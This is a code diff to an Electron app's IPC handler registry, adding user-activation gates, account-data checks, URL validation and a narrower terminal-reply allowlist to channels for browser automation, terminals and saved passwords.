@@ -1,14 +1,17 @@
 import {
+  BROWSER_TOOL_AUTHORIZATION_TIMEOUT_MS,
   type BrowserPanelAction,
   type BrowserPanelAnchor,
   type BrowserPanelBounds,
   type BrowserPanelSnapshot,
   isBrowserDataKind,
   isBrowserTheme,
-  isBrowserToolName,
+  isCurrentBrowserToolName,
 } from '@sim/browser-protocol'
 import {
   type DesktopNotificationPayload,
+  type DesktopServerChangeResult,
+  type DesktopServerConfiguration,
   type DesktopUpdateState,
   type DesktopWindowState,
   type DesktopZoomPercent,
@@ -17,36 +20,44 @@ import {
   isDesktopZoomPercent,
   isPendingDesktopScopeId,
 } from '@sim/desktop-bridge'
+import { createLogger } from '@sim/logger'
 import {
   isTerminalOperation,
   isTerminalToolName,
   type TerminalToolArgs,
 } from '@sim/terminal-protocol'
-import { isRecordLike } from '@sim/utils/object'
+import { getErrorMessage } from '@sim/utils/errors'
+import { isRecordLike, toRecord } from '@sim/utils/object'
+import { PASTE_LIMITS, utf8ByteLength } from '@sim/utils/paste'
 import type { BrowserWindow, IpcMainEvent, IpcMainInvokeEvent, WebContents } from 'electron'
-import { clipboard, ipcMain } from 'electron'
+import { clipboard, ipcMain, shell } from 'electron'
 import {
+  type BrowserToolQueueBoundary,
+  cancelActiveTool,
+  cancelTool,
+  captureBrowserToolQueueBoundary,
   clearBrowsingData,
   disposeBrowserScope,
   executeTool,
   getKnownSessions,
   handlePanelAction,
   migrateBrowserScope,
+  releaseBrowserToolQueueBoundary,
   restoreBrowserScope,
   showToolbarMenu,
   suspendBrowserScope,
 } from '@/main/browser-agent/driver'
 import { isAgentWebContents } from '@/main/browser-agent/registry'
 import {
+  addTab,
   findInActiveTab,
+  focusPageForUser,
   getBrowserDownloadsState,
   peekTabsState,
   reorderTab,
   setBrowserAppTheme,
-  setTabPinned,
   showBrowserDownloadInFolder,
   showBrowserDownloadsMenu,
-  showTabContextMenu,
   stopFindInActiveTab,
   withBrowserScope,
 } from '@/main/browser-agent/session'
@@ -65,19 +76,71 @@ import {
   importChromePasswords,
   listChromeImportProfiles,
 } from '@/main/browser-import'
+import { getSearchSuggestions } from '@/main/browser-search/suggestions'
 import { listSites } from '@/main/browser-sites'
 import { isSafeInternalPath } from '@/main/config'
 import type { DesktopSettingsService } from '@/main/desktop-settings'
 import { isDesktopPreferenceKey } from '@/main/desktop-settings'
 import { hasRecentDeliberateInput, hasRecentDiscreteInput } from '@/main/input-activity'
+import { executeLocalFileRequest } from '@/main/local-files'
 import type { LocalFilesystemService } from '@/main/local-filesystem'
 import { isAppOrigin, openExternalSafe } from '@/main/navigation'
 import type { ScopedEventRouter } from '@/main/scoped-event-router'
 import type { TerminalRegistry } from '@/main/terminal/registry'
 import { findCachedTerminalThemeProfile, listTerminalThemeProfiles } from '@/main/terminal-themes'
 
+const logger = createLogger('DesktopIpc')
+
 /** Workspace/chat ids are opaque tokens; anything else never reaches a URL. */
 const ID_PATTERN = /^[A-Za-z0-9_-]{1,128}$/
+const TERMINAL_WRITE_CHUNK_CHARACTERS = 64 * 1024
+
+function writeTerminalText(
+  terminal: TerminalRegistry,
+  scope: string,
+  terminalId: string,
+  text: string,
+  owner?: WebContents
+): boolean {
+  let start = 0
+  while (start < text.length) {
+    let end = Math.min(start + TERMINAL_WRITE_CHUNK_CHARACTERS, text.length)
+    const finalCode = text.charCodeAt(end - 1)
+    if (end < text.length && finalCode >= 0xd800 && finalCode <= 0xdbff) end -= 1
+    const chunk = text.slice(start, end)
+    if (owner) {
+      if (!terminal.writeUserInput(scope, terminalId, chunk, owner)) return false
+    } else {
+      terminal.write(scope, terminalId, chunk)
+    }
+    start = end
+  }
+  return true
+}
+
+const MICROPHONE_SETTINGS_URLS: Partial<Record<NodeJS.Platform, string>> = {
+  darwin: 'x-apple.systempreferences:com.apple.preference.security?Privacy_Microphone',
+  win32: 'ms-settings:privacy-microphone',
+}
+
+/** Opens the native microphone privacy pane without accepting a renderer-provided URL. */
+export async function openMicrophoneSettings(
+  platform: NodeJS.Platform = process.platform
+): Promise<boolean> {
+  const settingsUrl = MICROPHONE_SETTINGS_URLS[platform]
+  if (!settingsUrl) return false
+
+  try {
+    await shell.openExternal(settingsUrl)
+    return true
+  } catch (error) {
+    logger.warn('Could not open microphone privacy settings', {
+      error: getErrorMessage(error),
+      platform,
+    })
+    return false
+  }
+}
 
 /**
  * Desktop state is partitioned by the existing chat id. A new-chat view uses
@@ -87,9 +150,16 @@ function parseDesktopScope(raw: unknown): string | null {
   return isDesktopScopeId(raw) ? raw : null
 }
 
+function isDesktopToolCallId(raw: unknown): raw is string {
+  return typeof raw === 'string' && raw.length >= 1 && raw.length <= 256
+}
+
 export interface OAuthConnectScope {
+  sourceRequestId?: string
   workspaceId?: string
   credentialId?: string
+  draftId?: string
+  chatAttemptId?: string
 }
 
 /**
@@ -104,7 +174,12 @@ export function parseOAuthConnectScope(raw: unknown): OAuthConnectScope | undefi
   if (typeof raw !== 'object') {
     return undefined
   }
-  const { workspaceId, credentialId } = raw as { workspaceId?: unknown; credentialId?: unknown }
+  const { workspaceId, credentialId, draftId, chatAttemptId } = raw as {
+    workspaceId?: unknown
+    credentialId?: unknown
+    draftId?: unknown
+    chatAttemptId?: unknown
+  }
   if (
     workspaceId !== undefined &&
     (typeof workspaceId !== 'string' || !ID_PATTERN.test(workspaceId))
@@ -117,9 +192,20 @@ export function parseOAuthConnectScope(raw: unknown): OAuthConnectScope | undefi
   ) {
     return undefined
   }
+  if (draftId !== undefined && (typeof draftId !== 'string' || !ID_PATTERN.test(draftId))) {
+    return undefined
+  }
+  if (
+    chatAttemptId !== undefined &&
+    (typeof chatAttemptId !== 'string' || !ID_PATTERN.test(chatAttemptId))
+  ) {
+    return undefined
+  }
   return {
     ...(workspaceId !== undefined ? { workspaceId } : {}),
     ...(credentialId !== undefined ? { credentialId } : {}),
+    ...(draftId !== undefined ? { draftId } : {}),
+    ...(chatAttemptId !== undefined ? { chatAttemptId } : {}),
   }
 }
 
@@ -242,6 +328,10 @@ export function parseDesktopNotificationPayload(raw: unknown): DesktopNotificati
 export interface IpcDeps {
   appOrigin: () => string
   allowHttpLocalhost: () => boolean
+  /** False while local account-data persistence is unavailable or teardown must be retried. */
+  accountDataAvailable: () => boolean
+  /** Whether a frame URL is one of the bundled pages allowed to control the shell. */
+  isLocalPageUrl: (url: string) => boolean
   retryLoad: (sender: WebContents) => void
   localFilesystem: LocalFilesystemService
   terminal: TerminalRegistry
@@ -272,17 +362,26 @@ export interface IpcDeps {
     ) => boolean
   }
   beginOAuthConnect: (providerId: string, scope: OAuthConnectScope) => Promise<boolean>
+  prepareSourceConnect: () => string
+  cancelSourceConnect: (requestId: string) => boolean
   updates: {
     getState: () => DesktopUpdateState
     check: () => void
     install: () => void
+  }
+  server: {
+    open: () => void
+    getConfiguration: () => DesktopServerConfiguration
+    setOrigin: (origin: string) => Promise<DesktopServerChangeResult>
   }
 }
 
 /**
  * Who may call a channel:
  * - `app-origin`: only the remote app origin (main window pages).
- * - `local-page`: only bundled `file:` pages (offline) — shell control.
+ * - `local-page`: only the bundled pages served from the shell's own scheme
+ *   (offline, server) — shell control.
+ * - `app-or-local-page`: read-only window state used by both hosted and bundled pages.
  * - `browser-page`: only the built-in browser's own tabs, identified by
  *   WebContents rather than by URL. These carry reports from the browser
  *   preload about untrusted pages, so they are the one inbound surface whose
@@ -290,7 +389,7 @@ export interface IpcDeps {
  *   as an instruction.
  * - `any`: sender-independent channels that validate their input instead.
  */
-type ChannelGate = 'app-origin' | 'local-page' | 'browser-page' | 'any'
+type ChannelGate = 'app-origin' | 'local-page' | 'app-or-local-page' | 'browser-page' | 'any'
 
 /**
  * A desktop surface the user can switch off. Channels that drive one are
@@ -304,6 +403,10 @@ interface ChannelSpecBase {
   gate: ChannelGate
   passSender?: boolean
   requires?: ChannelFeature
+  /** Account-bearing storage must be readable and writable before this channel can run. */
+  requiresAccountData?: boolean
+  /** Requires a recent trusted input event for every call, or only selected argument shapes. */
+  needsUserActivation?: boolean | ((args: readonly unknown[]) => boolean)
   /**
    * Why this channel's `gate` or `requires` deviates from the rest of its
    * name family. Required by `check:desktop-ipc` for any channel that does,
@@ -319,29 +422,20 @@ interface ChannelSpecBase {
 type ChannelSpec =
   | (ChannelSpecBase & {
       kind: 'invoke'
-      /** Requires an in-progress user gesture in the calling page. */
-      needsUserActivation?: boolean
       /** Returned to the caller when a gate rejects the call. */
       denied: unknown
       handler: (...args: unknown[]) => unknown
     })
   | (ChannelSpecBase & {
       kind: 'send'
-      /**
-       * Requires recent real OS input before a payload is forwarded. Payload-
-       * scoped rather than channel-scoped because the same channel also carries
-       * terminal replies the PTY solicits, which arrive with no user input.
-       */
-      payloadNeedsDeliberateInput?: boolean
       handler: (...args: unknown[]) => void
     })
 
-function isLocalPageSender(event: IpcMainEvent | IpcMainInvokeEvent): boolean {
-  try {
-    return new URL(event.senderFrame?.url ?? '').protocol === 'file:'
-  } catch {
-    return false
-  }
+function isLocalPageSender(
+  event: IpcMainEvent | IpcMainInvokeEvent,
+  isLocalPageUrl: (url: string) => boolean
+): boolean {
+  return isLocalPageUrl(event.senderFrame?.url ?? '')
 }
 
 /**
@@ -386,43 +480,27 @@ function senderHasUserGesture(event: IpcMainEvent | IpcMainInvokeEvent): boolean
  * machine-generated and self-delimiting, which is what makes them safe to
  * enumerate.
  *
- * Bodies are printable-only ({@link PTY_REPLY_BODY}), never `[\s\S]`. A real
- * DCS or OSC reply carries text terminated by ST or BEL and never a control
- * byte, so an unbounded interior would let a hostile renderer wrap a whole
- * command and its submit inside a fake `ESC ] ... CR BEL` and be waved through
- * as a reply, reopening the path this gate exists to close. X10 mouse is
- * bounded the same way: its three bytes are offset by 32, so a control byte
- * there is never legitimate either.
+ * Only numeric/fixed device reports and fixed focus reports are included. DCS,
+ * OSC, and mouse responses are deliberately excluded even when well-formed:
+ * they do not need an unconditional path around the trusted-input gate.
  */
-const PTY_REPLY_BODY = '[\\u0020-\\u00ff]'
-const PTY_REPLY_PATTERNS = [
-  /\u001b\[[0-9;?]*[Rc]/, // DSR cursor position, device attributes
-  /\u001b\[[IO]/, // focus in/out (mode 1004)
-  new RegExp(`\\u001b\\[M${PTY_REPLY_BODY}{3}`), // X10 mouse report
-  /\u001b\[<[0-9;]*[mM]/, // SGR mouse report
-  new RegExp(`\\u001bP${PTY_REPLY_BODY}*?\\u001b\\\\`), // DCS response
-  new RegExp(`\\u001b\\]${PTY_REPLY_BODY}*?(?:\\u0007|\\u001b\\\\)`), // OSC response
-]
+const PTY_REPLY_PATTERNS = [/\u001b\[[0-9;?]*[Rc]/, /\u001b\[[IO]/]
 const PTY_REPLY = new RegExp(
   `^(?:${PTY_REPLY_PATTERNS.map((pattern) => pattern.source).join('|')})+$`
 )
+const MAX_TERMINAL_WRITE_CHARS = 256_000
+const MAX_PTY_REPLY_CHARS = 8_192
+const MAX_BROWSER_NAVIGATION_URL_CHARS = 8_192
 
-/**
- * Whether a terminal-write payload needs a person behind it.
- *
- * The reply set is enumerated and everything else is gated, rather than the
- * other way round. "What submits" is not a closed set: besides carriage return
- * and newline, EOT (`0x04`) hands a partial line straight to a reader in
- * canonical mode, and `0x0f` is `operate-and-get-next` in bash and
- * `accept-line-and-down-history` in zsh — both of which execute the current
- * line. A user's own `inputrc` or `zle` bindings can add more. Enumerating that
- * set would leave whichever binding was forgotten ungated, so the allowlist runs
- * the other way and fails closed.
- */
-function needsDeliberateInputForWrite(args: unknown[]): boolean {
-  const data = args[1]
-  if (typeof data !== 'string' || data.length === 0) return false
-  return !PTY_REPLY.test(data)
+function canonicalHttpNavigationUrl(rawUrl: unknown): string | null {
+  if (typeof rawUrl !== 'string' || rawUrl.length > MAX_BROWSER_NAVIGATION_URL_CHARS) return null
+  try {
+    const url = new URL(rawUrl)
+    if (url.protocol !== 'https:' && url.protocol !== 'http:') return null
+    return url.href.length <= MAX_BROWSER_NAVIGATION_URL_CHARS ? url.href : null
+  } catch {
+    return null
+  }
 }
 
 interface DesktopToolAuthorization {
@@ -434,11 +512,12 @@ interface DesktopToolAuthorization {
 async function fetchDesktopToolAuthorization(
   event: IpcMainInvokeEvent,
   deps: IpcDeps,
-  toolCallId: unknown
+  toolCallId: unknown,
+  claim = false,
+  onFailureStatus?: (status: number) => void
 ): Promise<DesktopToolAuthorization | null> {
-  if (typeof toolCallId !== 'string' || toolCallId.length < 1 || toolCallId.length > 256) {
-    return null
-  }
+  if (!isDesktopToolCallId(toolCallId)) return null
+  const startedAt = Date.now()
   try {
     const response = await event.sender.session.fetch(
       `${deps.appOrigin()}/api/desktop/tool/authorize`,
@@ -446,10 +525,19 @@ async function fetchDesktopToolAuthorization(
         method: 'POST',
         credentials: 'include',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ toolCallId }),
+        body: JSON.stringify({ toolCallId, ...(claim ? { claim: true } : {}) }),
+        signal: AbortSignal.timeout(BROWSER_TOOL_AUTHORIZATION_TIMEOUT_MS),
       }
     )
-    if (!response.ok) return null
+    if (!response.ok) {
+      onFailureStatus?.(response.status)
+      logger.warn('Desktop tool authorization was rejected', {
+        toolCallId,
+        status: response.status,
+        durationMs: Date.now() - startedAt,
+      })
+      return null
+    }
     const authorization = (await response.json()) as {
       chatId?: unknown
       toolName?: unknown
@@ -463,6 +551,10 @@ async function fetchDesktopToolAuthorization(
       authorization.args === null ||
       Array.isArray(authorization.args)
     ) {
+      logger.warn('Desktop tool authorization returned a malformed response', {
+        toolCallId,
+        durationMs: Date.now() - startedAt,
+      })
       return null
     }
     return {
@@ -470,7 +562,12 @@ async function fetchDesktopToolAuthorization(
       toolName: authorization.toolName,
       args: authorization.args as Record<string, unknown>,
     }
-  } catch {
+  } catch (error) {
+    logger.warn('Desktop tool authorization failed', {
+      toolCallId,
+      durationMs: Date.now() - startedAt,
+      error: getErrorMessage(error),
+    })
     return null
   }
 }
@@ -590,17 +687,27 @@ export function registerIpcHandlers(deps: IpcDeps): void {
     'desktop:open-external': {
       kind: 'invoke',
       gate: 'any',
+      needsUserActivation: true,
       deviationReason:
         'the offline and error pages are local-page senders, not app-origin, and handing a support link to the system browser is the one action that must work when the app cannot reach its origin at all',
       denied: false,
       handler: (url) =>
         typeof url === 'string' ? openExternalSafe(url, deps.allowHttpLocalhost()) : false,
     },
+    'desktop:open-microphone-settings': {
+      kind: 'invoke',
+      gate: 'app-origin',
+      needsUserActivation: true,
+      denied: false,
+      handler: () => openMicrophoneSettings(),
+    },
     // OAuth connect handoff: the whole flow runs in the system browser (state
     // is cookie-bound to the initiating user agent), returning via loopback.
     'desktop:oauth-connect': {
       kind: 'invoke',
       gate: 'app-origin',
+      requiresAccountData: true,
+      needsUserActivation: true,
       denied: false,
       handler: (providerId, scope) => {
         if (typeof providerId !== 'string') {
@@ -613,9 +720,47 @@ export function registerIpcHandlers(deps: IpcDeps): void {
         return deps.beginOAuthConnect(providerId, parsedScope)
       },
     },
+    'desktop:source-connect-prepare': {
+      kind: 'invoke',
+      gate: 'app-origin',
+      requiresAccountData: true,
+      needsUserActivation: true,
+      denied: null,
+      handler: () => deps.prepareSourceConnect(),
+    },
+    'desktop:source-connect': {
+      kind: 'invoke',
+      gate: 'app-origin',
+      requiresAccountData: true,
+      denied: false,
+      handler: (requestId) =>
+        typeof requestId === 'string' && /^[A-Za-z0-9_-]{32}$/.test(requestId)
+          ? deps.beginOAuthConnect('source', { sourceRequestId: requestId })
+          : false,
+    },
+    'desktop:source-connect-cancel': {
+      kind: 'invoke',
+      gate: 'app-origin',
+      requiresAccountData: true,
+      denied: false,
+      handler: (requestId) =>
+        typeof requestId === 'string' && /^[A-Za-z0-9_-]{32}$/.test(requestId)
+          ? deps.cancelSourceConnect(requestId)
+          : false,
+    },
+    'desktop:local-files': {
+      kind: 'invoke',
+      gate: 'app-origin',
+      requiresAccountData: true,
+      passSender: true,
+      denied: { ok: false, error: 'Local file tools are unavailable from this page.' },
+      handler: (_sender, request, authorization) =>
+        executeLocalFileRequest(request, authorization as DesktopToolAuthorization),
+    },
     'desktop:local-filesystem': {
       kind: 'invoke',
       gate: 'app-origin',
+      requiresAccountData: true,
       denied: {
         ok: false,
         code: 'ACCESS_DENIED',
@@ -632,10 +777,20 @@ export function registerIpcHandlers(deps: IpcDeps): void {
     'desktop:settings:set': {
       kind: 'invoke',
       gate: 'app-origin',
+      needsUserActivation: ([key]) => key === 'launchAtLogin',
       denied: null,
       handler: (key, value) =>
         isDesktopPreferenceKey(key) && typeof value === 'boolean'
           ? deps.settings.setPreference(key, value)
+          : deps.settings.getPreferences(),
+    },
+    'desktop:settings:set-browser-search-suggestions': {
+      kind: 'invoke',
+      gate: 'app-origin',
+      denied: null,
+      handler: (enabled) =>
+        typeof enabled === 'boolean'
+          ? deps.settings.setBrowserSearchSuggestionsEnabled(enabled)
           : deps.settings.getPreferences(),
     },
     'desktop:settings:set-appearance': {
@@ -707,7 +862,9 @@ export function registerIpcHandlers(deps: IpcDeps): void {
     },
     'desktop:window-state:get': {
       kind: 'invoke',
-      gate: 'app-origin',
+      gate: 'app-or-local-page',
+      deviationReason:
+        'Bundled offline pages share the app title-bar geometry and need their own native fullscreen state.',
       passSender: true,
       denied: { isFullScreen: false },
       handler: (sender) => deps.getWindowState(sender as WebContents),
@@ -721,11 +878,13 @@ export function registerIpcHandlers(deps: IpcDeps): void {
     'desktop:updates:check': {
       kind: 'send',
       gate: 'app-origin',
+      needsUserActivation: true,
       handler: () => deps.updates.check(),
     },
     'desktop:updates:install': {
       kind: 'send',
       gate: 'app-origin',
+      needsUserActivation: true,
       handler: () => deps.updates.install(),
     },
     'browser-agent:execute-tool': {
@@ -733,12 +892,53 @@ export function registerIpcHandlers(deps: IpcDeps): void {
       gate: 'app-origin',
       requires: 'browser',
       denied: { ok: false, error: 'Browser automation is not allowed from this page.' },
-      handler: (scope, tool, params) => {
-        if (typeof scope !== 'string' || typeof tool !== 'string' || !isBrowserToolName(tool)) {
+      handler: (scope, toolCallId, tool, params, authorizationBoundary) => {
+        if (
+          typeof scope !== 'string' ||
+          typeof toolCallId !== 'string' ||
+          typeof tool !== 'string' ||
+          !isCurrentBrowserToolName(tool)
+        ) {
           return { ok: false, error: `Unknown browser tool: ${String(tool)}` }
         }
-        const toolParams = isRecordLike(params) ? params : {}
-        return executeTool(scope, tool, toolParams)
+        const toolParams = toRecord(params)
+        return executeTool(
+          scope,
+          tool,
+          toolParams,
+          toolCallId,
+          authorizationBoundary as BrowserToolQueueBoundary | undefined
+        )
+      },
+    },
+    'browser-agent:cancel-tool': {
+      kind: 'invoke',
+      gate: 'app-origin',
+      requires: 'browser',
+      passSender: true,
+      denied: false,
+      handler: (sender, toolCallId, rawScope) => {
+        const scope = rendererScope(browserScopeBySender, sender as WebContents, rawScope)
+        if (
+          !scope ||
+          typeof toolCallId !== 'string' ||
+          toolCallId.length < 1 ||
+          toolCallId.length > 256
+        ) {
+          return false
+        }
+        return cancelTool(scope, toolCallId)
+      },
+    },
+    'browser-agent:cancel-active-tool': {
+      kind: 'invoke',
+      gate: 'app-origin',
+      requires: 'browser',
+      passSender: true,
+      denied: false,
+      handler: (sender, rawScope) => {
+        const scope = rendererScope(browserScopeBySender, sender as WebContents, rawScope)
+        return scope ? cancelActiveTool(scope) : false
       },
     },
     'browser-agent:get-tabs-state': {
@@ -753,6 +953,47 @@ export function registerIpcHandlers(deps: IpcDeps): void {
         return scope
           ? withBrowserScope(scope, () => peekTabsState())
           : { tabs: [], activeTabId: null }
+      },
+    },
+    'browser-agent:open-tab': {
+      kind: 'invoke',
+      gate: 'app-origin',
+      requires: 'browser',
+      passSender: true,
+      denied: { scopeId: '', tabs: [], activeTabId: null },
+      handler: (sender, rawScope) => {
+        const contents = sender as WebContents
+        const scope = activeRendererScope(browserScopeBySender, contents, rawScope)
+        if (!scope) return { scopeId: '', tabs: [], activeTabId: null }
+        return withBrowserScope(scope, () => {
+          addTab()
+          return peekTabsState()
+        })
+      },
+    },
+    'browser-agent:open-url': {
+      kind: 'invoke',
+      gate: 'app-origin',
+      requires: 'browser',
+      passSender: true,
+      needsUserActivation: true,
+      denied: { scopeId: '', tabs: [], activeTabId: null },
+      handler: (sender, rawUrl, rawScope) => {
+        const contents = sender as WebContents
+        const scope = activeRendererScope(browserScopeBySender, contents, rawScope)
+        const destination = canonicalHttpNavigationUrl(rawUrl)
+        if (!scope || !destination) {
+          return { scopeId: '', tabs: [], activeTabId: null }
+        }
+        return withBrowserScope(scope, () => {
+          const tab = addTab()
+          if (tab.view.webContents.isDestroyed()) {
+            return peekTabsState()
+          }
+          void tab.view.webContents.loadURL(destination).catch(() => {})
+          focusPageForUser(tab.view.webContents)
+          return peekTabsState()
+        })
       },
     },
     'browser-agent:activate-scope': {
@@ -843,14 +1084,26 @@ export function registerIpcHandlers(deps: IpcDeps): void {
     'browser-agent:get-known-sessions': {
       kind: 'invoke',
       gate: 'app-origin',
+      requiresAccountData: true,
       deviationReason:
         "read/reset of the surface's own data; gating it on the surface would strand the browsing trail with no way to inspect or erase it",
       denied: { sessions: [] },
       handler: () => getKnownSessions(),
     },
+    'browser-agent:search-suggestions': {
+      kind: 'invoke',
+      gate: 'app-origin',
+      requires: 'browser',
+      denied: [],
+      handler: (query) =>
+        deps.settings.getPreferences().browserSearchSuggestionsEnabled === false
+          ? []
+          : getSearchSuggestions(query),
+    },
     'browser-agent:clear-browsing-data': {
       kind: 'invoke',
       gate: 'app-origin',
+      requiresAccountData: true,
       deviationReason:
         'erasing browsing data has to work with the browser off, which is the state a user clearing it is most likely to be in',
       needsUserActivation: true,
@@ -925,6 +1178,11 @@ export function registerIpcHandlers(deps: IpcDeps): void {
       gate: 'app-origin',
       requires: 'browser',
       passSender: true,
+      needsUserActivation: ([action]) => {
+        if (!isRecordLike(action)) return false
+        if (action.action === 'navigate') return true
+        return action.action === 'respond-media-permission' && action.allowed === true
+      },
       handler: (sender, action, rawScope) => {
         const scope = activeRendererScope(browserScopeBySender, sender as WebContents, rawScope)
         if (
@@ -935,31 +1193,14 @@ export function registerIpcHandlers(deps: IpcDeps): void {
         ) {
           return
         }
-        void handlePanelAction(scope, action as BrowserPanelAction).catch(() => {})
-      },
-    },
-    'browser-agent:set-tab-pinned': {
-      kind: 'send',
-      gate: 'app-origin',
-      requires: 'browser',
-      passSender: true,
-      handler: (sender, tabId, pinned, rawScope) => {
-        const scope = activeRendererScope(browserScopeBySender, sender as WebContents, rawScope)
-        if (!scope || typeof tabId !== 'string' || typeof pinned !== 'boolean') return
-        try {
-          withBrowserScope(scope, () => setTabPinned(tabId, pinned))
-        } catch {}
-      },
-    },
-    'browser-agent:show-tab-context-menu': {
-      kind: 'send',
-      gate: 'app-origin',
-      requires: 'browser',
-      passSender: true,
-      handler: (sender, tabId, rawScope) => {
-        const scope = activeRendererScope(browserScopeBySender, sender as WebContents, rawScope)
-        if (!scope || typeof tabId !== 'string') return
-        withBrowserScope(scope, () => showTabContextMenu(tabId))
+        const panelAction = action as BrowserPanelAction
+        if (panelAction.action === 'navigate') {
+          const destination = canonicalHttpNavigationUrl(panelAction.url)
+          if (!destination) return
+          void handlePanelAction(scope, { ...panelAction, url: destination }).catch(() => {})
+          return
+        }
+        void handlePanelAction(scope, panelAction).catch(() => {})
       },
     },
     'browser-agent:reorder-tab': {
@@ -1147,20 +1388,33 @@ export function registerIpcHandlers(deps: IpcDeps): void {
       kind: 'send',
       gate: 'browser-page',
       deviationReason:
-        "the only sender in this family that is a browser PAGE rather than the Sim app, so browser-page is the correct gate and requires:'browser' follows — with the browser off no such page exists",
+        'the isolated browser preload reports its own form; app renderers cannot claim browser targets',
       requires: 'browser',
       passSender: true,
       handler: (sender, report) => {
         if (!isRecordLike(report)) return
-        const { origin, hasLoginForm, hasPasswordField } = report as {
+        const { origin, hasLoginForm, hasPasswordField, targetId, bounds } = report as {
           origin?: unknown
           hasLoginForm?: unknown
           hasPasswordField?: unknown
+          targetId?: unknown
+          bounds?: unknown
         }
         if (
           typeof origin !== 'string' ||
           typeof hasLoginForm !== 'boolean' ||
-          typeof hasPasswordField !== 'boolean'
+          typeof hasPasswordField !== 'boolean' ||
+          (targetId !== null && (typeof targetId !== 'string' || !ID_PATTERN.test(targetId))) ||
+          (bounds !== null &&
+            (!isRecordLike(bounds) ||
+              !['x', 'y', 'width', 'height'].every(
+                (key) =>
+                  typeof bounds[key] === 'number' &&
+                  Number.isFinite(bounds[key]) &&
+                  Math.abs(bounds[key]) <= 100_000
+              ) ||
+              Number(bounds.width) <= 0 ||
+              Number(bounds.height) <= 0))
         ) {
           return
         }
@@ -1168,18 +1422,76 @@ export function registerIpcHandlers(deps: IpcDeps): void {
           origin,
           hasLoginForm,
           hasPasswordField,
+          targetId: typeof targetId === 'string' ? targetId : null,
+          bounds: isRecordLike(bounds)
+            ? {
+                x: Number(bounds.x),
+                y: Number(bounds.y),
+                width: Number(bounds.width),
+                height: Number(bounds.height),
+              }
+            : null,
         })
+      },
+    },
+    'browser-credentials:fill-result': {
+      kind: 'send',
+      gate: 'browser-page',
+      deviationReason:
+        'only the isolated browser preload acknowledges a fill; no secret values are returned',
+      requires: 'browser',
+      passSender: true,
+      handler: (sender, result) => {
+        if (
+          !isRecordLike(result) ||
+          typeof result.requestId !== 'string' ||
+          !ID_PATTERN.test(result.requestId)
+        )
+          return
+        if (
+          result.status !== 'filled' &&
+          result.status !== 'stale-target' &&
+          result.status !== 'failed'
+        )
+          return
+        fillCoordinator()?.noteFillResult(sender as WebContents, {
+          requestId: result.requestId,
+          status: result.status,
+        })
+      },
+    },
+    'browser-credentials:picker': {
+      kind: 'send',
+      gate: 'browser-page',
+      deviationReason:
+        'real input in the browser page opens the trusted picker; selection is authorized separately in its bundled window',
+      requires: 'browser',
+      needsUserActivation: true,
+      passSender: true,
+      handler: (sender, action) => {
+        if (action !== 'open' && action !== 'focus' && action !== 'dismiss') return
+        void fillCoordinator()
+          ?.requestPicker(sender as WebContents, action)
+          .catch((error) => {
+            logger.warn('Could not open saved password picker', { error: getErrorMessage(error) })
+          })
       },
     },
     'browser-credentials:available': {
       kind: 'invoke',
       gate: 'app-origin',
+      deviationReason:
+        'vault availability is account data and remains readable while the browser surface is disabled',
+      requiresAccountData: true,
       denied: false,
       handler: () => credentialsAvailable(),
     },
     'browser-credentials:list': {
       kind: 'invoke',
       gate: 'app-origin',
+      deviationReason:
+        'password management remains available while the browser surface is disabled',
+      requiresAccountData: true,
       denied: [],
       handler: () => listCredentials(),
     },
@@ -1204,6 +1516,7 @@ export function registerIpcHandlers(deps: IpcDeps): void {
     'browser-import:sites': {
       kind: 'invoke',
       gate: 'app-origin',
+      requiresAccountData: true,
       deviationReason:
         'a read of already-imported data; settings lists these hosts to show what an import brought over, which is what you look at while deciding whether to enable the browser',
       denied: [],
@@ -1215,6 +1528,9 @@ export function registerIpcHandlers(deps: IpcDeps): void {
     'browser-credentials:reveal': {
       kind: 'invoke',
       gate: 'app-origin',
+      deviationReason:
+        'OS-authenticated password management does not require an active browser surface',
+      requiresAccountData: true,
       needsUserActivation: true,
       denied: null,
       handler: (id) => (typeof id === 'string' ? revealCredential(id) : null),
@@ -1222,6 +1538,9 @@ export function registerIpcHandlers(deps: IpcDeps): void {
     'browser-credentials:copy': {
       kind: 'invoke',
       gate: 'app-origin',
+      deviationReason:
+        'OS-authenticated password copying does not require an active browser surface',
+      requiresAccountData: true,
       needsUserActivation: true,
       denied: false,
       handler: (id) => (typeof id === 'string' ? copyCredential(id) : false),
@@ -1229,6 +1548,9 @@ export function registerIpcHandlers(deps: IpcDeps): void {
     'browser-credentials:forget': {
       kind: 'invoke',
       gate: 'app-origin',
+      deviationReason:
+        'users must be able to remove saved credentials while the browser surface is disabled',
+      requiresAccountData: true,
       needsUserActivation: true,
       denied: [],
       handler: (id) => (typeof id === 'string' ? forgetCredential(id) : listCredentials()),
@@ -1236,6 +1558,9 @@ export function registerIpcHandlers(deps: IpcDeps): void {
     'browser-credentials:forget-all': {
       kind: 'invoke',
       gate: 'app-origin',
+      deviationReason:
+        'users must be able to clear saved credentials while the browser surface is disabled',
+      requiresAccountData: true,
       needsUserActivation: true,
       denied: [],
       handler: () => forgetAllCredentials(),
@@ -1263,9 +1588,7 @@ export function registerIpcHandlers(deps: IpcDeps): void {
         )
       },
     },
-    // Opens the native account chooser. The renderer only says "the user
-    // clicked the key icon, here"; it never learns which accounts exist, never
-    // names one, and never receives a password. The shell performs the fill.
+    /** The app requests a trusted chooser; only its selected account reaches the live page. */
     'browser-credentials:show-chooser': {
       kind: 'invoke',
       gate: 'app-origin',
@@ -1299,39 +1622,20 @@ export function registerIpcHandlers(deps: IpcDeps): void {
         return fillCoordinator()?.fillCredential(id, scope) ?? false
       },
     },
-    'terminal:start': {
+    'terminal:restore-scope': {
       kind: 'invoke',
       gate: 'app-origin',
       requires: 'terminal',
       passSender: true,
-      denied: { ok: false, code: 'ACCESS_DENIED', error: 'Not allowed from this page.' },
-      handler: (sender, raw, rawScope) => {
-        const contents = sender as WebContents
-        const scope = rendererScope(terminalScopeBySender, contents, rawScope)
-        if (!scope) {
-          return { ok: false, code: 'STALE_SCOPE', error: 'This terminal chat is not active.' }
-        }
-        const options = isRecordLike(raw) ? raw : {}
-        const cols = Number(options.cols)
-        const rows = Number(options.rows)
+      denied: { tabs: [], activeTerminalId: null },
+      handler: (sender, rawScope) => {
+        const scope = rendererScope(terminalScopeBySender, sender as WebContents, rawScope)
+        if (!scope) return { tabs: [], activeTerminalId: null }
         try {
-          return {
-            ok: true,
-            tabs: {
-              ...deps.terminal.start(scope, {
-                cols: toCellCount(cols, 80),
-                rows: toCellCount(rows, 24),
-              }),
-              scopeId: scope,
-            },
-          }
